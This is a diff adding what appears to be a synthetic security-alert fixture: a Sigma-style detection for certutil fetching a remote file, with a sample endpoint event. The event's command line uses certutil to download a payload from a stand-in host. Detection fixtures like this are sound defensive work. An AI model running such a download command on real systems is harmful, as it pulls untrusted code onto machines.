@@ -1,0 +1,29 @@
+{
+  "sigma_rule": {
+    "id": "AL-2002",
+    "title": "Certutil used to fetch remote file",
+    "score": 9,
+    "logsource": "endpoint",
+    "tags": [
+      "T1105"
+    ]
+  },
+  "alert_id": "SAMPLE-02",
+  "matched_at": "2026-03-03T08:58:32Z",
+  "event": {
+    "host": "WS-072",
+    "asset_criticality": "low",
+    "user_privilege": "standard",
+    "event_count": 1,
+    "device_known": true,
+    "geo_country": "IN",
+    "geo_usual": true,
+    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+    "full_log": "Certutil used to fetch remote file observed on sensor",
+    "user": "emp095.test",
+    "process": "certutil.exe",
+    "command_line": "certutil.exe -urlcache -split -f http://example.org/p.bin p.bin",
+    "file_hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+    "url": "http://example.org/p.bin"
+  }
+}
